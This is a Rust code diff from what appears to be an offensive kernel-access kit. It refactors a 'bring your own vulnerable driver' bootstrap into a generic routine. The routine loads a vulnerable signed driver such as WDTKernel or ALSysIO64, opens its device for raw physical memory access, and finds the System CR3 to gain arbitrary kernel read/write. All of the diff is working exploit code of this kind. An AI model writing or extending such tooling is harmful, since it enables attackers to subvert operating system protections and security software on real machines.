@@ -169,15 +169,45 @@ pub unsafe fn bootstrap_wdt(
     eprocess: &EprocessOffsets,
     scan_budget_mb: usize,
 ) -> Result<(LoadedDriver, VaKernelRw<WdtPhys>), KitError> {
+    unsafe {
+        bootstrap_phys_with(
+            sys_path,
+            svc_name,
+            nt_base,
+            eprocess,
+            scan_budget_mb,
+            open_wdt,
+        )
+    }
+}
+
+/// Generic physical-mode BYOVD bootstrap — the shared skeleton for every
+/// phys-only driver (WDTKernel, ALSysIO64, …): load driver → `open_fn()`
+/// the device → discover System CR3 (physical scan + MZ-validated page walk)
+/// → wrap in [`VaKernelRw`]. Any stage failure unloads the driver before
+/// returning the error, so a failed bootstrap leaves no loaded-driver
+/// residue.
+///
+/// # Safety
+/// Loads a kernel driver and opens its device. Same BSOD contract as
+/// [`bootstrap_wdt`]: risk lives only in the returned rw.
+pub unsafe fn bootstrap_phys_with<P: PhysRead + PhysWrite>(
+    sys_path: &[u16],
+    svc_name: &[u16],
+    nt_base: u64,
+    eprocess: &EprocessOffsets,
+    scan_budget_mb: usize,
+    open_fn: unsafe fn() -> Result<P, KrwError>,
+) -> Result<(LoadedDriver, VaKernelRw<P>), KitError> {
     let loaded = unsafe { LoadedDriver::load(sys_path, svc_name) }
         .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;
 
-    let phys = match unsafe { open_wdt() } {
+    let phys = match unsafe { open_fn() } {
         Ok(p) => p,
         Err(e) => {
             let mut l = loaded;
             l.unload();
-            return Err(KitError::Other(alloc::format!("wdt open: {}", e)));
+            return Err(KitError::Other(alloc::format!("phys device open: {}", e)));
         }
     };
 
@@ -187,7 +217,7 @@ pub unsafe fn bootstrap_wdt(
             let mut l = loaded;
             l.unload();
             return Err(KitError::Other(
-                "wdt cr3 discovery failed (scan budget exhausted, no validated candidate)".into(),
+                "cr3 discovery failed (scan budget exhausted, no validated candidate)".into(),
             ));
         }
     };
